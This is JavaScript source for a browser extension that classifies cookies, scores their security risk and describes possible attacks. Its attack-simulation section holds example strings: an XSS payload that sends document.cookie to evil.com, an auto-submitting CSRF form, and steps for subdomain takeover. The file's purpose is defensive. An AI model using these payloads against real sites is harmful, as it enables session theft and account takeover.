/**
 * CookieGuard AI 2.0 — Self-Contained Analysis Engine
 * Ports: feature_extractor.py, risk_scorer.py, explainability.py, attack_simulator.py
 * No backend required — runs entirely in the browser extension.
 */

// ═══════════════════════════════════════════════════════════════
//  FEATURE EXTRACTOR (38 features)
// ═══════════════════════════════════════════════════════════════

const AUTH_PATTERNS = [/session/i, /auth/i, /token/i, /login/i, /jwt/i, /bearer/i, /sid/i, /user/i, /sso/i, /refresh/i];
const TRACKING_PATTERNS = [/^_ga/i, /^_gid/i, /analytics/i, /tracking/i, /^utm/i, /^fbp/i, /amplitude/i, /mixpanel/i, /^_cl/i];
const PREFERENCE_PATTERNS = [/lang/i, /theme/i, /consent/i, /preferences/i, /settings/i, /locale/i, /timezone/i, /currency/i];

// ── TRACKER DOMAIN MAP ──
const TRACKER_MAP = {
  // Google
  'google-analytics.com':'Google','analytics.google.com':'Google',
  'googletagmanager.com':'Google','googletagservices.com':'Google',
  'doubleclick.net':'Google','googlesyndication.com':'Google',
  'googleadservices.com':'Google','google.com':'Google',
  'googleapis.com':'Google','gstatic.com':'Google',
  // Meta
  'facebook.com':'Meta','facebook.net':'Meta',
  'connect.facebook.net':'Meta','instagram.com':'Meta',
  'fbcdn.net':'Meta','atdmt.com':'Meta',
  // Amazon
  'amazon-adsystem.com':'Amazon','amazon.com':'Amazon',
  'amazonwebservices.com':'Amazon','aws.amazon.com':'Amazon',
  'images-amazon.com':'Amazon','media-amazon.com':'Amazon',
  // Microsoft
  'bing.com':'Microsoft','bat.bing.com':'Microsoft',
  'clarity.ms':'Microsoft','microsoft.com':'Microsoft',
  'msecnd.net':'Microsoft','live.com':'Microsoft',
  // TikTok
  'tiktok.com':'TikTok','ads.tiktok.com':'TikTok','bytedance.com':'TikTok',
  // Twitter/X
  'twitter.com':'X/Twitter','t.co':'X/Twitter','ads-twitter.com':'X/Twitter','twimg.com':'X/Twitter',
  // LinkedIn
  'linkedin.com':'LinkedIn','licdn.com':'LinkedIn',
  // Snap
  'snapchat.com':'Snap','sc-static.net':'Snap','snap.com':'Snap',
  // Analytics & session recording
  'hotjar.com':'Hotjar','mixpanel.com':'Mixpanel','amplitude.com':'Amplitude',
  'segment.com':'Segment','segment.io':'Segment',
  'fullstory.com':'FullStory','heap.io':'Heap',
  'mouseflow.com':'Mouseflow','logrocket.com':'LogRocket',
  'intercom.io':'Intercom','intercom.com':'Intercom',
  // Ad networks
  'criteo.com':'Criteo','outbrain.com':'Outbrain','taboola.com':'Taboola',
  'quantserve.com':'Quantcast','scorecardresearch.com':'Comscore',
  'chartbeat.com':'Chartbeat','optimizely.com':'Optimizely',
  'pubmatic.com':'PubMatic','rubiconproject.com':'Rubicon',
  'openx.com':'OpenX','adnxs.com':'Xandr','appnexus.com':'Xandr',
  'casalemedia.com':'Casale Media','indexww.com':'Index Exchange',
  'advertising.com':'AOL/Oath','oath.com':'Oath',
  'tremorhub.com':'Tremor','sharethrough.com':'Sharethrough',
  // CDN-hosted trackers
  'cloudflare.com':'Cloudflare','cloudflareinsights.com':'Cloudflare',
};

function detectTrackerCompany(domain) {
  if (!domain) return null;
  const d = domain.replace(/^\./, '').toLowerCase();
  for (const [td, company] of Object.entries(TRACKER_MAP)) {
    if (d === td || d.endsWith('.' + td)) return company;
  }
  return null;
}

function computeIdentityExposure(authCount, riskCount) {
  if (riskCount > 0) return 'High';
  if (authCount > 0) return 'Medium';
  return 'Low';
}

function computeTrackingExposure(trackerCount, thirdPartyDomainCount) {
  if (trackerCount >= 5 || thirdPartyDomainCount >= 8) return 'High';
  if (trackerCount >= 2) return 'Medium';
  return 'Low';
}

const FEATURE_NAMES = [
  // Attributes (7)
  'has_secure','has_httponly','has_samesite','samesite_level',
  'is_session_cookie','expiry_days','lifetime_category',
  // Scope (7)
  'domain_is_wildcard','domain_depth','etld_match',
  'path_is_root','path_depth','cross_site_sendable','exposure_score',
  // Lexical (16)
  'name_matches_auth','name_matches_tracking','name_matches_preference',
  'has_host_prefix','has_secure_prefix','name_entropy','name_length',
  'name_has_underscore','value_length','value_entropy_bucket',
  'value_looks_like_jwt','value_looks_like_hex','value_looks_base64',
  'value_has_padding','value_is_numeric','value_length_bucket',
  // Behavior (8)
  'f_changed_during_login','f_new_after_login','f_rotated_after_login',
  'f_persistent_days_bucket','f_subdomain_shared','f_third_party_context',
  'f_login_behavior_score','f_security_posture_score',
];

function entropy(text) {
  if (!text) return 0;
  const counts = {};
  for (const c of text) counts[c] = (counts[c] || 0) + 1;
  let ent = 0;
  const len = text.length;
  for (const cnt of Object.values(counts)) {
    const p = cnt / len;
    ent -= p * Math.log2(p);
  }
  return ent;
}

function extractFeatures(cookie, context = {}) {
  const f = {};
  const sameSite = (cookie.sameSite || '').toLowerCase();

  // Group 1: Attributes
  f.has_secure = cookie.secure ? 1 : 0;
  f.has_httponly = cookie.httpOnly ? 1 : 0;
  f.has_samesite = cookie.sameSite ? 1 : 0;
  f.samesite_level = sameSite === 'strict' ? 2 : (sameSite === 'lax' ? 1 : 0);

  const expiry = cookie.expirationDate;
  if (expiry) {
    const days = Math.max(Math.floor((expiry * 1000 - Date.now()) / 86400000), 0);
    f.is_session_cookie = 0;
    f.expiry_days = Math.min(days, 365);
    f.lifetime_category = days < 1 ? 0 : (days < 7 ? 1 : (days < 30 ? 2 : 3));
  } else {
    f.is_session_cookie = 1;
    f.expiry_days = 0;
    f.lifetime_category = 0;
  }

  // Group 2: Scope
  const domain = cookie.domain || '';
  const path = cookie.path || '/';
  f.domain_is_wildcard = domain.startsWith('.') ? 1 : 0;
  f.domain_depth = (domain.match(/\./g) || []).length;
  f.etld_match = 1;
  f.path_is_root = path === '/' ? 1 : 0;
  f.path_depth = Math.max((path.match(/\//g) || []).length - 1, 0);
  f.cross_site_sendable = (!sameSite || sameSite === 'none' || sameSite === 'no_restriction') ? 1 : 0;
  f.exposure_score = (f.domain_is_wildcard ? 2.0 : 1.0) * (1 + f.expiry_days / 365.0);

  // Group 3: Lexical
  const name = (cookie.name || '').toLowerCase();
  const value = cookie.value || '';

  f.name_matches_auth = AUTH_PATTERNS.some(p => p.test(name)) ? 1 : 0;
  f.name_matches_tracking = TRACKING_PATTERNS.some(p => p.test(name)) ? 1 : 0;
  f.name_matches_preference = PREFERENCE_PATTERNS.some(p => p.test(name)) ? 1 : 0;
  f.has_host_prefix = name.startsWith('__host-') ? 1 : 0;
  f.has_secure_prefix = name.startsWith('__secure-') ? 1 : 0;
  f.name_entropy = entropy(name);
  f.name_length = name.length;
  f.name_has_underscore = name.includes('_') ? 1 : 0;

  if (value) {
    const ent = entropy(value);
    f.value_length = value.length;
    f.value_entropy_bucket = ent < 2 ? 0 : (ent < 4 ? 1 : 2);
    f.value_looks_like_jwt = (value.split('.').length === 3 && value.length > 50) ? 1 : 0;
    f.value_looks_like_hex = /^[a-f0-9]+$/i.test(value) ? 1 : 0;
    const b64chars = new Set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-_');
    const unique = new Set(value);
    let nonB64 = 0;
    for (const c of unique) if (!b64chars.has(c)) nonB64++;
    f.value_looks_base64 = (nonB64 < Math.max(unique.size * 0.1, 1)) ? 1 : 0;
    f.value_has_padding = value.endsWith('=') ? 1 : 0;
    f.value_is_numeric = /^\d+$/.test(value) ? 1 : 0;
    f.value_length_bucket = value.length < 20 ? 0 : (value.length < 50 ? 1 : (value.length < 100 ? 2 : 3));
  } else {
    f.value_length = 0; f.value_entropy_bucket = 0; f.value_looks_like_jwt = 0;
    f.value_looks_like_hex = 0; f.value_looks_base64 = 0; f.value_has_padding = 0;
    f.value_is_numeric = 0; f.value_length_bucket = 0;
  }

  // Group 4: Behavior
  const cookieName = cookie.name || '';
  const changed = context.changedCookies || [];
  const loginEvent = context.loginEvent || false;
  const beforeIndex = context.beforeCookieIndex || {};
  const currentDomain = context.currentDomain || '';

  if (loginEvent && changed.length > 0) {
    f.f_changed_during_login = changed.includes(cookieName) ? 1 : 0;
    const wasPresent = cookieName in beforeIndex;
    f.f_new_after_login = wasPresent ? 0 : 1;
    f.f_rotated_after_login = (wasPresent && beforeIndex[cookieName]?.present) ? 1 : 0;
  } else {
    f.f_changed_during_login = 0;
    f.f_new_after_login = 0;
    f.f_rotated_after_login = 0;
  }

  const days = f.expiry_days;
  if (f.is_session_cookie) f.f_persistent_days_bucket = 0;
  else if (days <= 7) f.f_persistent_days_bucket = 1;
  else if (days <= 30) f.f_persistent_days_bucket = 2;
  else f.f_persistent_days_bucket = 3;

  const hostOnly = cookie.hostOnly;
  f.f_subdomain_shared = (domain.startsWith('.') || (hostOnly !== undefined && !hostOnly)) ? 1 : 0;

  if (currentDomain) {
    const cleanDomain = domain.replace(/^\./, '');
    f.f_third_party_context = (cleanDomain !== currentDomain && !cleanDomain.endsWith('.' + currentDomain)) ? 1 : 0;
  } else {
    f.f_third_party_context = 0;
  }

  f.f_login_behavior_score = f.f_changed_during_login + f.f_new_after_login + f.f_rotated_after_login;
  f.f_security_posture_score = f.has_secure + f.has_httponly + Math.min(f.samesite_level, 1);

  return f;
}

function featuresToArray(features) {
  return new Float32Array(FEATURE_NAMES.map(n => features[n] || 0));
}


// ═══════════════════════════════════════════════════════════════
//  RISK SCORER
// ═══════════════════════════════════════════════════════════════

function scoreRisk(cookie, mlType, mlConfidence, mlProbs, siteHost) {
  const issues = [];
  const recommendations = [];
  let riskScore = 0;
  const isAuth = mlType === 'authentication' || (mlProbs.authentication || 0) > 0.3;
  const name = cookie.name || '';
  const domain = cookie.domain || '';
  const path = cookie.path || '/';
  const sameSite = (cookie.sameSite || '').toLowerCase();
  const expiry = cookie.expirationDate;

  if (isAuth) {
    if (!cookie.httpOnly) {
      issues.push({ severity: 'critical', title: 'Missing HttpOnly Flag',
        description: 'Cookie accessible via JavaScript - vulnerable to XSS attacks that can steal session tokens',
        impact: 'Account takeover via cross-site scripting (XSS)' });
      riskScore += 40;
      recommendations.push('This site left your login cookie exposed to JavaScript. Consider using a browser extension that blocks inline scripts.');
    }
    if (!cookie.secure) {
      issues.push({ severity: 'high', title: 'Missing Secure Flag',
        description: 'Cookie sent over HTTP - vulnerable to network interception',
        impact: 'Session token exposure on unsecured connections' });
      riskScore += 25;
      recommendations.push('Your session cookie can be sent over unencrypted HTTP. Avoid using this site on public WiFi. Consider a VPN.');
    }
    if (!sameSite || sameSite === 'none' || sameSite === 'no_restriction') {
      issues.push({ severity: 'high', title: 'Missing SameSite Protection',
        description: 'Cookie sent with cross-site requests - vulnerable to CSRF attacks',
        impact: 'Unauthorized actions via cross-site request forgery' });
      riskScore += 20;
      recommendations.push('This cookie is sent on cross-site requests. Be cautious clicking links from untrusted sources while logged in.');
    }

    let breadthFactor = 1.0;
    const hostOnly = cookie.hostOnly;

    if (domain.startsWith('.')) {
      issues.push({ severity: 'medium', title: 'Wildcard Domain - Subdomain Takeover Risk',
        description: `Cookie accessible to all subdomains of ${domain.slice(1)}. If attacker controls ANY subdomain, they can steal this cookie.`,
        impact: 'Session hijacking via compromised subdomain' });
      riskScore += 15;
      recommendations.push('This cookie is shared across all subdomains. Log out after each session and clear cookies regularly.');
      breadthFactor = 1.5;

      if (path === '/' && !name.startsWith('__Host-')) {
        issues.push({ severity: 'low', title: 'Broad Path Scope',
          description: 'Cookie accessible to all paths on domain.',
          impact: 'Increased exposure surface' });
        riskScore += 5;
      }
    } else if (hostOnly === false && domain && domain !== 'localhost') {
      if (!siteHost || domain !== siteHost) {
        issues.push({ severity: 'low', title: 'Non-host-only Domain Scope',
          description: `Cookie set with Domain attribute (${domain}). Broader than host-only.`,
          impact: 'Potential cross-subdomain cookie access' });
        riskScore += 6;
        breadthFactor = 1.15;
      }
    }

    let lifetimeFactor = 1.0;
    if (expiry) {
      const days = Math.max((expiry - Date.now() / 1000) / 86400, 0);
      if (days > 30) {
        issues.push({ severity: 'medium', title: 'Long-Lived Session Cookie',
          description: `Cookie expires in ${Math.round(days)} days. Extended lifetime increases window for session replay attacks.`,
          impact: 'Extended exposure window for stolen tokens' });
        riskScore += 10;
        recommendations.push('This login cookie has a long lifetime. Log out manually when done.');
      } else if (days > 7) {
        issues.push({ severity: 'low', title: 'Moderate Session Lifetime',
          description: `Cookie expires in ${Math.round(days)} days.`,
          impact: 'Moderate exposure window' });
        riskScore += 5;
      } else if (days >= 3) {
        riskScore += 3;
      }
      lifetimeFactor = 1.0 + Math.min(days / 365.0, 1.0);
    }

    riskScore = Math.round(riskScore * breadthFactor * lifetimeFactor);
  }

  let severity;
  if (riskScore >= 50) severity = 'critical';
  else if (riskScore >= 30) severity = 'high';
  else if (riskScore >= 15) severity = 'medium';
  else if (riskScore > 0) severity = 'low';
  else severity = 'info';

  return { score: riskScore, severity, issues, recommendations };
}


// ═══════════════════════════════════════════════════════════════
//  EXPLAINABILITY ENGINE
// ═══════════════════════════════════════════════════════════════

const AUTH_SIGNAL_MAP = {
  name_matches_auth: ['Identity keyword in name', 'Cookie name matches authentication patterns (session, auth, token, etc.)'],
  f_changed_during_login: ['Changed during login', 'Cookie value changed when user logged in — strong authentication signal'],
  f_new_after_login: ['Appeared after login', 'Cookie was created during the login process'],
  f_rotated_after_login: ['Rotated after login', 'Cookie value was rotated at login — typical of session tokens'],
  has_httponly: ['HttpOnly flag set', 'Server restricted JavaScript access — common for auth cookies'],
  has_secure: ['Secure flag set', 'Cookie requires HTTPS — standard for sensitive tokens'],
  is_session_cookie: ['Session-scoped', 'Cookie expires when browser closes — typical for session tokens'],
  value_looks_like_jwt: ['JWT token pattern', 'Value matches JSON Web Token structure'],
  value_entropy_bucket: ['High-entropy token', 'Cookie value has high randomness — characteristic of cryptographic tokens'],
  value_looks_like_hex: ['Hex token value', 'Value is hexadecimal — common for session identifiers'],
  value_length_bucket: ['Long token value', 'Cookie value length suggests a security token'],
  has_host_prefix: ['__Host- prefix', 'Uses secure __Host- prefix — locked to specific origin'],
  f_login_behavior_score: ['Strong login correlation', 'Multiple login-related behavior signals detected'],
};

const RISK_SIGNAL_MAP = {
  cross_site_sendable: ['Sent cross-site (SameSite=None)', 'Cookie is sent with cross-origin requests, enabling CSRF attacks'],
  domain_is_wildcard: ['Shared across subdomains', 'Wildcard domain scope — any subdomain can access this cookie'],
  f_subdomain_shared: ['Subdomain-shared scope', 'Cookie accessible to multiple subdomains'],
  f_third_party_context: ['Third-party context', 'Cookie set by or shared with a different domain'],
  exposure_score: ['High exposure score', 'Combined domain scope and lifetime create elevated exposure'],
  f_persistent_days_bucket: ['Long-lived cookie', 'Extended lifetime increases window for replay attacks'],
};

const TRACKING_SIGNAL_MAP = {
  name_matches_tracking: ['Tracking keyword in name', 'Name matches known analytics/tracking patterns'],
  f_third_party_context: ['Third-party tracker', 'Cookie is set by an external domain'],
};

function isSignalActive(feat, val) {
  if (feat === 'value_entropy_bucket') return val >= 2;
  if (feat === 'value_length_bucket') return val >= 2;
  if (feat === 'exposure_score') return val > 1.5;
  if (feat === 'f_persistent_days_bucket') return val >= 3;
  if (feat === 'f_login_behavior_score') return val >= 2;
  return val > 0;
}

function explainPrediction(features, classType, classProbs, riskIssues) {
  const authSignals = [], riskSignals = [], trackingSignals = [];

  if (classType === 'authentication' || (classProbs.authentication || 0) > 0.3) {
    for (const [feat, [short, detail]] of Object.entries(AUTH_SIGNAL_MAP)) {
      const val = features[feat] || 0;
      if (isSignalActive(feat, val)) {
        authSignals.push({ signal: short, detail, feature: feat, value: val });
      }
    }
  }

  for (const [feat, [short, detail]] of Object.entries(RISK_SIGNAL_MAP)) {
    const val = features[feat] || 0;
    if (isSignalActive(feat, val)) {
      riskSignals.push({ signal: short, detail, feature: feat, value: val });
    }
  }

  if (classType === 'tracking' || (classProbs.tracking || 0) > 0.3) {
    for (const [feat, [short, detail]] of Object.entries(TRACKING_SIGNAL_MAP)) {
      const val = features[feat] || 0;
      if (isSignalActive(feat, val)) {
        trackingSignals.push({ signal: short, detail, feature: feat, value: val });
      }
    }
  }

  // Risk formula breakdown
  const authProb = classProbs.authentication || 0;
  const sevPointMap = {
    httponly: 40, 'secure flag': 25, samesite: 20,
    'wildcard domain': 15, 'long-lived': 10, 'moderate session': 5,
    'multi-day': 3, 'broad path': 5, 'non-host-only': 6,
  };
  let sevPoints = 0;
  for (const issue of riskIssues) {
    const t = (issue.title || '').toLowerCase();
    for (const [pat, pts] of Object.entries(sevPointMap)) {
      if (t.includes(pat)) { sevPoints += pts; break; }
    }
  }
  const breadth = features.domain_is_wildcard ? 1.5 : 1.0;
  const lifetime = features.is_session_cookie ? 1.0 : (1.0 + Math.min((features.expiry_days || 0) / 365.0, 1.0));
  const estimated = authProb > 0.3 ? Math.round(sevPoints * breadth * lifetime) : 0;

  let interpretation;
  if (authProb > 0.7 && estimated >= 50) interpretation = 'High-confidence auth cookie with critical security gaps — account takeover possible';
  else if (authProb > 0.7 && estimated >= 30) interpretation = 'High-confidence auth cookie with significant security gaps';
  else if (authProb > 0.7) interpretation = 'Auth cookie with good security posture — low risk';
  else if (authProb > 0.3 && estimated >= 30) interpretation = 'Possible auth cookie with elevated risk';
  else if (authProb > 0.3) interpretation = 'Possible auth cookie with moderate risk';
  else interpretation = 'Low authentication probability — severity checks not applied';

  return {
    auth_signals: authSignals.slice(0, 5),
    risk_signals: riskSignals.slice(0, 3),
    tracking_signals: trackingSignals.slice(0, 3),
    risk_formula: {
      components: {
        auth_gate: Math.round(authProb * 1000) / 1000,
        severity_points: sevPoints,
        breadth_factor: Math.round(breadth * 100) / 100,
        lifetime_factor: Math.round(lifetime * 100) / 100,
        estimated_score: estimated,
      },
      formula: 'RiskScore = Σ(Severity Points) × Breadth × Lifetime  [gated on P(auth) > 0.3]',
      interpretation,
    },
  };
}


// ═══════════════════════════════════════════════════════════════
//  ATTACK SIMULATOR
// ═══════════════════════════════════════════════════════════════

function simulateAttacks(cookie, classType, riskSeverity, features) {
  const paths = [], fixes = [];
  const isAuth = classType === 'authentication';
  const name = cookie.name || '';
  const domain = cookie.domain || '';
  const secure = !!cookie.secure;
  const httpOnly = !!cookie.httpOnly;
  const sameSite = (cookie.sameSite || '').toLowerCase();
  const expiry = cookie.expirationDate;

  // XSS
  if (!httpOnly) {
    paths.push({
      type: 'XSS', name: 'Cross-Site Scripting (Cookie Theft)',
      severity: isAuth ? 'critical' : 'medium',
      description: `An attacker who finds an XSS vulnerability can read "${name}" via document.cookie. ${isAuth ? 'This is an auth cookie — stolen tokens allow full account takeover.' : 'Cookie value could be exfiltrated.'}`,
      technique: 'Inject <script>fetch("https://evil.com?c="+document.cookie)</script> via XSS vector',
      precondition: 'XSS vulnerability exists on the site',
    });
    fixes.push({
      fix: 'Use a script-blocking extension',
      impact: 'Reduces XSS risk by blocking inline scripts',
      effort: 'Low',
      code: 'Install uBlock Origin or NoScript',
      site_should_fix: `Set-Cookie: ${name}=...; HttpOnly`,
    });
  }

  // CSRF
  if (!sameSite || sameSite === 'none' || sameSite === 'no_restriction') {
    paths.push({
      type: 'CSRF', name: 'Cross-Site Request Forgery',
      severity: isAuth ? 'high' : 'low',
      description: `Cookie "${name}" is sent with cross-site requests (SameSite=${sameSite || 'not set'}). An attacker can trigger authenticated requests on behalf of the user.`,
      technique: 'Host a page with: <form action="https://target.com/transfer" method="POST"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>',
      precondition: 'User visits attacker-controlled page while logged in',
    });
    fixes.push({
      fix: 'Avoid clicking untrusted links while logged in',
      impact: 'CSRF requires visiting a malicious page',
      effort: 'Low',
      code: 'Log out of sensitive sites before browsing untrusted content',
      site_should_fix: `Set-Cookie: ${name}=...; SameSite=Lax`,
    });
  }

  // Subdomain takeover
  if (domain.startsWith('.') || (features.f_subdomain_shared && isAuth)) {
    paths.push({
      type: 'SUBDOMAIN', name: 'Subdomain Takeover / Cookie Tossing',
      severity: isAuth ? 'high' : 'medium',
      description: `Cookie "${name}" is scoped to wildcard domain "${domain}". If an attacker gains control of ANY subdomain, they can read or overwrite this cookie.`,
      technique: `1. Find unused subdomain of ${domain.replace(/^\./, '')}\n2. Claim via cloud provider\n3. Read document.cookie or set malicious replacement`,
      precondition: `Attacker controls a subdomain of ${domain.replace(/^\./, '')}`,
    });
    fixes.push({
      fix: 'Clear cookies after sensitive sessions',
      impact: 'Limits window for subdomain-based cookie theft',
      effort: 'Low',
      code: 'Use browser "Clear cookies on exit" setting',
      site_should_fix: `Set-Cookie: ${name}=...; Domain=${domain.replace(/^\./, '')}`,
    });
  }

  // Network sniffing
  if (!secure) {
    paths.push({
      type: 'NETWORK', name: 'Network Interception (Man-in-the-Middle)',
      severity: isAuth ? 'high' : 'low',
      description: `Cookie "${name}" is transmitted over unencrypted HTTP. On public WiFi, an attacker can intercept it.`,
      technique: 'ARP spoof + packet capture on same network, or rogue WiFi access point',
      precondition: 'User on shared/compromised network + any HTTP request to site',
    });
    fixes.push({
      fix: 'Avoid this site on public WiFi or use a VPN',
      impact: 'Encrypts traffic so cookies cannot be intercepted',
      effort: 'Low',
      code: 'Enable HTTPS-only mode in browser settings',
      site_should_fix: `Set-Cookie: ${name}=...; Secure`,
    });
  }

  // Session replay
  if (expiry && isAuth) {
    const days = Math.max((expiry - Date.now() / 1000) / 86400, 0);
    if (days > 30) {
      paths.push({
        type: 'REPLAY', name: 'Session Replay (Long-Lived Token)',
        severity: 'medium',
        description: `Cookie "${name}" expires in ~${Math.round(days)} days. If stolen, the attacker has a ${Math.round(days)}-day window to replay the session.`,
        technique: 'Stolen cookie replayed via browser extension or curl',
        precondition: 'Cookie stolen via one of the above methods',
      });
      fixes.push({
        fix: 'Log out manually and clear cookies regularly',
        impact: 'Invalidates the session token',
        effort: 'Low',
        code: 'Log out after each session',
        site_should_fix: `Set-Cookie: ${name}=...; Max-Age=86400`,
      });
    }
  }

  // Dedupe fixes
  const seen = new Set();
  const uniqueFixes = fixes.filter(f => { if (seen.has(f.fix)) return false; seen.add(f.fix); return true; });

  let overall;
  if (isAuth && paths.length >= 2) overall = 'CRITICAL — Multiple attack vectors can lead to account takeover';
  else if (isAuth && paths.length === 1) overall = 'HIGH — Single attack vector could compromise authentication';
  else if (paths.length > 0) overall = 'MODERATE — Attack paths exist but limited impact for non-auth cookie';
  else overall = 'LOW — No significant attack vectors identified';

  return {
    paths, path_count: paths.length, overall_risk: overall,
    impact: summarizeImpact(paths, isAuth), fixes: uniqueFixes,
    attack_surface_score: Math.min(paths.length * 25, 100),
  };
}

function summarizeImpact(paths, isAuth) {
  const types = paths.map(p => p.type);
  if (!types.length) return 'No actionable attack vectors detected for this cookie.';
  if (isAuth) {
    if (types.includes('XSS') && types.includes('CSRF')) return 'Attacker can steal session via XSS and perform actions via CSRF — full account compromise possible.';
    if (types.includes('XSS')) return 'Attacker can steal authentication token via XSS — direct account takeover.';
    if (types.includes('CSRF')) return 'Attacker can perform authenticated actions on behalf of the user via CSRF.';
    if (types.includes('NETWORK')) return 'Session token exposed to network interception — hijacking possible on insecure connections.';
    if (types.includes('SUBDOMAIN')) return 'Subdomain compromise can lead to cookie theft and session hijacking.';
  }
  return `${types.length} potential attack vector(s) identified.`;
}


// ═══════════════════════════════════════════════════════════════
//  ONNX INFERENCE (loads model lazily)
// ═══════════════════════════════════════════════════════════════

let onnxSession = null;
let modelClasses = null;

async function loadModel() {
  if (onnxSession) return;
  try {
    // Configure ONNX Runtime to find WASM files in our lib/ directory
    if (typeof ort !== 'undefined') {
      ort.env.wasm.wasmPaths = chrome.runtime.getURL('lib/');
      // Disable threads (not supported in extension popup context)
      ort.env.wasm.numThreads = 1;
      console.log('[CookieGuard] ONNX Runtime found, WASM path:', ort.env.wasm.wasmPaths);
    } else {
      console.warn('[CookieGuard] ort global not found — ONNX Runtime not loaded');
      return;
    }

    const modelUrl = chrome.runtime.getURL('model/cookieguard_model.onnx');
    const metaUrl = chrome.runtime.getURL('model/model_meta.json');

    console.log('[CookieGuard] Loading model from:', modelUrl);

    const metaResp = await fetch(metaUrl);
    const meta = await metaResp.json();
    modelClasses = meta.classes;
    console.log('[CookieGuard] Model classes:', modelClasses);

    onnxSession = await ort.InferenceSession.create(modelUrl, {
      executionProviders: ['wasm'],
    });
    console.log('[CookieGuard] ONNX model loaded successfully');
  } catch (e) {
    console.error('[CookieGuard] ONNX model load failed:', e);
    console.error('[CookieGuard] Error details:', e.message, e.stack);
    onnxSession = null;
  }
}

function isModelLoaded() {
  return onnxSession !== null && modelClasses !== null;
}

async function classifyWithONNX(featureArray) {
  if (!onnxSession || !modelClasses) return null;
  try {
    const tensor = new ort.Tensor('float32', featureArray, [1, featureArray.length]);
    const results = await onnxSession.run({ features: tensor });

    // RF with zipmap=False outputs:
    //   'label': string tensor with predicted class name
    //   'probabilities': float32 tensor [1, n_classes] with class probabilities
    const labelData = results.label?.data;
    const label = labelData ? String(labelData[0]) : null;

    let probabilities = {};
    const probData = results.probabilities?.data;
    if (probData && probData.length >= modelClasses.length) {
      modelClasses.forEach((cls, i) => {
        probabilities[cls] = probData[i] || 0;
      });
    }

    // Fallback if probabilities not extracted
    if (Object.keys(probabilities).length === 0 && label) {
      modelClasses.forEach(cls => { probabilities[cls] = cls === label ? 0.9 : 0.033; });
    }

    const type = label || modelClasses[0];
    const confidence = probabilities[type] || 0;

    console.log('[CookieGuard] ONNX classify:', type, confidence.toFixed(3));
    return { type, confidence, probabilities };
  } catch (e) {
    console.warn('[CookieGuard] ONNX inference failed:', e.message);
    return null;
  }
}


// ═══════════════════════════════════════════════════════════════
//  RULE-BASED CLASSIFIER (fallback when ONNX unavailable)
// ═══════════════════════════════════════════════════════════════

function classifyRuleBased(features) {
  const authScore = (features.name_matches_auth * 0.35) +
    (features.f_login_behavior_score > 0 ? 0.25 : 0) +
    (features.has_httponly * 0.10) +
    (features.value_entropy_bucket >= 2 ? 0.15 : 0) +
    (features.value_looks_like_jwt * 0.10) +
    (features.has_secure * 0.05);

  const trackScore = (features.name_matches_tracking * 0.50) +
    (features.f_third_party_context * 0.25) +
    (!features.has_httponly && features.f_persistent_days_bucket >= 2 ? 0.15 : 0) +
    (features.value_is_numeric * 0.10);

  const prefScore = (features.name_matches_preference * 0.60) +
    (features.value_length_bucket === 0 ? 0.20 : 0) +
    (features.value_is_numeric * 0.10) +
    (!features.has_httponly && !features.has_secure ? 0.10 : 0);

  const scores = { authentication: authScore, tracking: trackScore, preference: prefScore, other: 0.25 };
  const total = Object.values(scores).reduce((a, b) => a + b, 0);
  const probs = {};
  for (const [k, v] of Object.entries(scores)) probs[k] = total > 0 ? v / total : 0.25;

  const type = Object.entries(probs).sort((a, b) => b[1] - a[1])[0][0];
  return { type, confidence: probs[type], probabilities: probs };
}


// ═══════════════════════════════════════════════════════════════
//  MAIN ANALYSIS PIPELINE
// ═══════════════════════════════════════════════════════════════

async function analyzeAllCookies(cookies, context = {}) {
  await loadModel();

  const results = [];
  for (const cookie of cookies) {
    const features = extractFeatures(cookie, context);
    const fArray = featuresToArray(features);

    // ML classification (ONNX or rule-based fallback)
    let classification = await classifyWithONNX(fArray);
    const mlMode = classification ? 'onnx' : 'rule';
    if (!classification) classification = classifyRuleBased(features);

    // Risk scoring
    const risk = scoreRisk(cookie, classification.type, classification.confidence, classification.probabilities, context.currentDomain);

    // Explainability
    const explanations = explainPrediction(features, classification.type, classification.probabilities, risk.issues);

    // Attack simulation
    const attackSim = simulateAttacks(cookie, classification.type, risk.severity, features);

    // Behavior signals for UI
    const behaviorSignals = {
      changed_during_login: !!features.f_changed_during_login,
      new_after_login: !!features.f_new_after_login,
      rotated_after_login: !!features.f_rotated_after_login,
      login_behavior_score: features.f_login_behavior_score,
      third_party: !!features.f_third_party_context,
      subdomain_shared: !!features.f_subdomain_shared,
    };

    // Needs review flag
    const authProb = classification.probabilities.authentication || 0;
    const needsReview = classification.type === 'authentication' && (authProb < 0.8 || classification.confidence < 0.7);

    results.push({
      cookie: {
        name: cookie.name,
        domain: cookie.domain,
        path: cookie.path || '/',
        secure: !!cookie.secure,
        httpOnly: !!cookie.httpOnly,
        sameSite: cookie.sameSite || '',
        expirationDate: cookie.expirationDate,
        hostOnly: cookie.hostOnly,
        value: cookie.value,
      },
      classification: {
        type: classification.type,
        confidence: classification.confidence,
        probabilities: classification.probabilities,
        mode: mlMode,
      },
      risk: {
        score: risk.score,
        severity: risk.severity,
        issues: risk.issues,
      },
      recommendations: risk.recommendations,
      explanations,
      attack_simulation: attackSim,
      behavior_signals: behaviorSignals,
      _needsReview: needsReview,
    });
  }

  // Sort by risk
  results.sort((a, b) => (b.risk.score - a.risk.score) || ((b.classification.probabilities.authentication || 0) - (a.classification.probabilities.authentication || 0)));

  // Summary
  const summary = { total_cookies: results.length, critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const r of results) summary[r.risk.severity] = (summary[r.risk.severity] || 0) + 1;

  return { cookies: results, summary, context };
}

// Export for popup.js
if (typeof window !== 'undefined') {
  window.CookieGuardEngine = {
    analyzeAllCookies,
    extractFeatures,
    featuresToArray,
    classifyWithONNX,
    classifyRuleBased,
    scoreRisk,
    explainPrediction,
    simulateAttacks,
    loadModel,
    _isModelLoaded: isModelLoaded,
    FEATURE_NAMES,
    detectTrackerCompany,
    computeIdentityExposure,
    computeTrackingExposure,
    TRACKER_MAP,
  };
}